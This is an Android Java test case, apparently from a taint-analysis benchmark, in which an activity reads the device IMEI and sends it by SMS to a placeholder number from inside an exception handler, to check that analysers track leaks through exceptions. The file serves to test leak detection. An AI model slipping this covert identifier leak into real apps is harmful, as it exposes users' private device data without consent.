package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * @testcase_name Exceptions1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security
 and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description tainted data is created and sent out in an exception handler
 * @dataflow source -> imei -> exception handler -> sink
 * @number_of_leaks 1
 * @challenges the analysis must handle exceptions
 */
public class Exceptions1 extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        String imei = "";
        try {
            TelephonyManager telephonyManager =
              (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            imei = telephonyManager.getDeviceId();
            throw new RuntimeException();
        }
        catch (RuntimeException ex) {
            SmsManager sm = SmsManager.getDefault();
            sm.sendTextMessage("+49 1234", null, imei, null, null);
        }
    }
    
    public Exceptions1() { super(); }
    
    public static final String jlc$CompilerVersion$jl7 = "2.7.1";
    public static final long jlc$SourceLastModified$jl7 = 1450032968000L;
    public static final String jlc$ClassType$jl7 =
      ("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" +
       "+v8PgdoA5coPAAA=");
}
